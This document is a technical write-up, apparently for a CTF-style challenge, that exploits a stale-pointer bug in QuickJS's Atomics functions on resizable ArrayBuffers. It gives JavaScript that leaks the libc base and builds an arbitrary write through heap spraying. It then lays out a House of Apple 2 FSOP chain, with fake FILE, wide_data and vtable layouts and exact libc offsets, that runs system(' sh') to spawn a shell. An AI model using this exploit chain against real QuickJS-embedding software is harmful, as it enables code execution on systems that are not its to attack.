# FSOP Shell Execution Exploit Analysis

## Vulnerability Summary

The vulnerability exists in QuickJS's `js_atomics_op()` and `js_atomics_store()` functions when handling resizable ArrayBuffers. A pointer to the buffer's data is captured before user code runs via `valueOf()`, but `valueOf()` can trigger a buffer resize, causing the captured pointer to become stale.

## Exploitation Strategy

### Target: Full RELRO Binary
With Full RELRO, the GOT is read-only, and hooks like `__free_hook` are deprecated in glibc 2.41. The exploitation uses **FSOP (File Stream Oriented Programming)** via the **House of Apple 2** technique.

### Step 1: Information Leak (libc base)

Using a 2048-byte ArrayBuffer that gets resized to 4096 bytes:
1. The original 2048-byte chunk is freed
2. It goes into the unsorted bin
3. The freed chunk's fd/bk pointers contain `main_arena+96` (offset 0x1e7b20)
4. Reading from the stale pointer leaks this address

```javascript
let leakBuffer = new ArrayBuffer(2048, { maxByteLength: 4096 });
let leakArr = new BigUint64Array(leakBuffer);

let libcLeak = Atomics.add(leakArr, 0, {
    valueOf: function() {
        leakBuffer.resize(4096);
        return 0n;
    }
});

let libcBase = libcLeak - BigInt("0x1e7b20");
```

### Step 2: Arbitrary Write Primitive

The exploit corrupts TypedArray data pointers to achieve arbitrary write:

1. Pre-allocate 200 8-byte ArrayBuffers
2. Create a 72-byte victim ArrayBuffer (resizable to 288)
3. In `valueOf()`:
   - Resize victim from 72 to 288 bytes (triggers realloc)
   - Create BigUint64Arrays on pre-allocated buffers
   - These TypedArrays may get their internal data pointer set to the freed victim space
4. The write to index 7 of the victim lands in a spray array's header
5. Writing to `spray[0][0]` writes to the corrupted (target) address

### Step 3: FSOP - House of Apple 2

The attack chains:
1. `exit()` → `_IO_flush_all_lockp()` iterates FILE structures via `_IO_list_all`
2. For our fake FILE with `_mode > 0`, it calls `_IO_OVERFLOW(fp, EOF)`
3. With vtable = `_IO_wfile_jumps`, calls `_IO_wfile_overflow()`
4. `_IO_wfile_overflow()` calls `_IO_wdoallocbuf()` when `_wide_data->_IO_buf_base == 0`
5. `_IO_wdoallocbuf()` calls `_IO_WDOALLOCATE(fp)` = `fp->_wide_data->_wide_vtable->__doallocate(fp)`
6. We set `__doallocate` (offset 0x68 in vtable) to `system()`
7. `system(fp)` executes with `fp` pointing to " sh\0" (our fake FILE's _flags field)

### Key Memory Layout

**Fake FILE structure** (at `libcBase + 0x1ee300`):
- 0x00: _flags = " sh\0" (0x00687320) - command string, doesn't set _IO_NO_WRITES
- 0x88: _lock = stdout's lock (0x1e97b0) - prevents NULL dereference
- 0xa0: _wide_data = pointer to fake wide_data
- 0xc0: _mode = 1 (triggers wide path)
- 0xd8: vtable = _IO_wfile_jumps (0x1e61c8)

**Fake wide_data structure** (at `fakeFile + 0x100`):
- 0x20: _IO_write_ptr = 1 (> _IO_write_base triggers overflow)
- 0xe0: _wide_vtable = pointer to fake vtable

**Fake vtable** (at `wide_data + 0x100`):
- 0x68: __doallocate = system address (0x53110)

### Critical Implementation Details

1. **JIT batch allocation**: Each arbitrary write allocates a fresh batch of 200 ArrayBuffers. Pre-allocating all batches causes heap corruption that crashes subsequent operations.

2. **Lock pointer**: The fake FILE's `_lock` field must point to a valid lock structure (stdout's lock works) to prevent crash in `_IO_flockfile()`.

3. **Command string**: The first byte of " sh\0" (0x20 = space) doesn't have bit 3 set, so `_IO_NO_WRITES (0x8)` check passes.

## Execution Flow

```
exit()
  └─ _IO_flush_all_lockp()
       └─ iterate _IO_list_all (we overwrote to point to fake FILE)
            └─ check: _mode > 0 && _wide_data->_IO_write_ptr > _IO_write_base
                 └─ _IO_OVERFLOW(fake_FILE, EOF)
                      └─ _IO_wfile_overflow() (via _IO_wfile_jumps vtable)
                           └─ _IO_wdoallocbuf() (since _IO_buf_base == 0)
                                └─ _IO_WDOALLOCATE(fp)
                                     └─ fp->_wide_data->_wide_vtable->__doallocate(fp)
                                          └─ system(" sh") → SHELL!
```

## Key Addresses (offsets from libc base)

| Symbol | Offset |
|--------|--------|
| system | 0x53110 |
| _IO_list_all | 0x1e84c0 |
| _IO_wfile_jumps | 0x1e61c8 |
| _IO_stdfile_1_lock | 0x1e97b0 |
| main_arena+96 | 0x1e7b20 |
| Writable .bss area | 0x1ee300 |
